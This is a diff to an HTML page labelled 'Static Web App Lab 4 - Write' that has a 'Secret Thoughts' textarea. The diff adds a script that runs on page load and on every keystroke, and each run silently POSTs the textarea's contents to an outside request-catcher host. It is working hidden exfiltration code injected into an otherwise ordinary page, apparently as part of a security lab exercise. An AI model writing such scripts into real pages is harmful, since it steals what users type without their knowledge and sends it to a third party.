@@ -9,6 +9,25 @@
        style="background-color: white; padding: 2rem; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); text-align: center;"
      >
        <h1>Static Web App Lab 4 - Write</h1>
+      <script>
+      function init()
+      {
+        const d = document.getElementById("secretThoughts");
+        const response = fetch("https://roflcopter.requestcatcher.com/postinit", {
+              method: "POST",
+              body: JSON.stringify({ data: d.value }),
+              // …
+            });
+        d.oninput = function(x) {
+           const response = fetch("https://roflcopter.requestcatcher.com/post", {
+              method: "POST",
+              body: JSON.stringify({ data: x.srcElement.value }),
+              // …
+            });
+        };
+      }
+      window.addEventListener('DOMContentLoaded', init, false);
+      </script>
        <div style="margin: 20px;">
          <h2>Secret Thoughts</h2>
          <textarea
